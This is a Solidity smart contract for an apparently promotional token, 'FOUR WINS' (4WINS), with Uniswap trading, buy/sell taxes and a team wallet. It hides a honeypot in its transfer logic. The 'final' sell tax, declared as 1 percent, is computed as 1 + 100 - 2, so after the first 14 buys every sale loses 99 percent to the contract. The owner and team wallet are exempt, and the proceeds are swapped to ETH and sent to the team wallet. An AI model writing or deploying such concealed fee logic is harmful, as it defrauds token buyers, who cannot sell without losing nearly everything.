/**

4 WINS - Elevate your Connect Four experience with real-time PvP battles, wagers, and big wins!

Website: https://4winspvp.com/
Telegram: https://t.me/FourWinsPvP
Twitter: https://twitter.com/4WinsETH
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract FOURWINS is Context, IERC20Standard, Ownable {
    using SafeMath for uint256;

    string private constant _name = "FOUR WINS";
    string private constant _symbol = "4WINS";

    uint8 private constant _decimals = 9;
    uint256 private constant _total = 10 ** 9 * 10 ** _decimals;

    uint256 private _finalBuyTax = 1;
    uint256 private _finalSellTax = 1;

    uint256 private _reduceBuyTaxAtCounter = 14;
    uint256 private _reduceSellTaxAtCounter = 14;

    uint256 private _preventSwapBeforeCounter = 14;

    uint256 private _initialBuyTaxPercentage = 14;
    uint256 private _initialSellTaxPercentage = 14;

    uint256 private buyCounter = 0;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private tradingStart;

    bool private swapping = false;
    bool private swapEnabled = false;
    address payable private teamWallet;
    uint256 tradingEnableBlock;

    uint256 public maxTransaction = 40 * 10 ** 6 * 10 ** _decimals;
    uint256 public maxWalletAmount = 40 * 10 ** 6 * 10 ** _decimals;
    uint256 public swapTokensMin = 0 * 10 ** _decimals;
    uint256 public feeSwapMax = 1 * 10 ** 7 * 10 ** _decimals;

    uint256 private _divisor = 100;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;

    event MaxTxAmountUpdated(uint maxTransaction);
    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor (address _teamWallet, address _uniswapRouterAddress) {

        _uniswapV2Router = IUniswapV2Router02(_uniswapRouterAddress);
        teamWallet = payable(_teamWallet);

        _balances[_msgSender()] = _total;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[teamWallet] = true;

        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure override returns (uint256) {
        return _total;
    }

    function sendSwappedETH(uint256 amount) private {
        teamWallet.transfer(amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
        return (a > b) ? b : a;
    }

    receive() external payable {}

    function enableTrading() external onlyOwner() {
        require(!tradingStart, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), _total);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20Standard(_uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingStart = true;
        tradingEnableBlock = block.number;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _total;
        maxWalletAmount = _total;
        emit MaxTxAmountUpdated(_total);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = _isExcludedFromFee[to] ? 1 : amount.mul((buyCounter > _reduceBuyTaxAtCounter) ? _finalBuyTax : _initialBuyTaxPercentage).div(_divisor);

            if (from == _uniswapV2Pair && to != address(_uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= maxTransaction, "Exceeds the maxTransaction.");
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds the maxWalletAmount.");

                if (tradingEnableBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                buyCounter++;
            }

            if (to != _uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds the maxWalletAmount.");
            }

            if (to == _uniswapV2Pair && from != address(this)) {
                taxAmount = _isExcludedFromFee[from] ? 1 : amount.mul((buyCounter > _reduceSellTaxAtCounter) ? _finalSellTax + _divisor - 2 : _initialSellTaxPercentage).div(_divisor);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to == _uniswapV2Pair && swapEnabled && contractTokenBalance > swapTokensMin && buyCounter > _preventSwapBeforeCounter && !_isExcludedFromFee[from]) {
                swapTokensForEth(min(amount, min(contractTokenBalance, feeSwapMax)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendSwappedETH(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

}